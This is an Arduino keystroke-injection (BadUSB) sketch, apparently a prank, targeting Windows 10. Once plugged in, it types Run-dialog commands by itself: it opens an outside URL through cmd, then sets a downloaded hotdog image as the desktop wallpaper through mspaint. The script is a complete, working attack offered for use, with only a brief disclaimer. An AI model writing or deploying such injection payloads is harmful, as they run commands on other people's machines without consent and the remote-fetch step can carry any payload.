/**
 * AUTHOR: Eddie Devine
 * TARGET: Windows 10
 * DESCRIPTION: Changes the desktop background to a picture of hotdogs.
 * DO NOT USE THIS SCRIPT FOR HARMFUL OR ILLEGAL PURPOSES
 * 
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);
  Keyboard.print(F("cmd /c start https://mal.eddie09.repl.co"));

  typeKey(KEY_RETURN);

  delay(3000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('w');
  Keyboard.releaseAll();

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);
  Keyboard.print(F("mspaint C:\\Users\\%USERNAME%\\Downloads\\hotdog.jpg"));

  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('f');
  Keyboard.releaseAll();

  delay(100);
  Keyboard.print(F("k"));

  delay(100);
  Keyboard.print(F("f"));

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
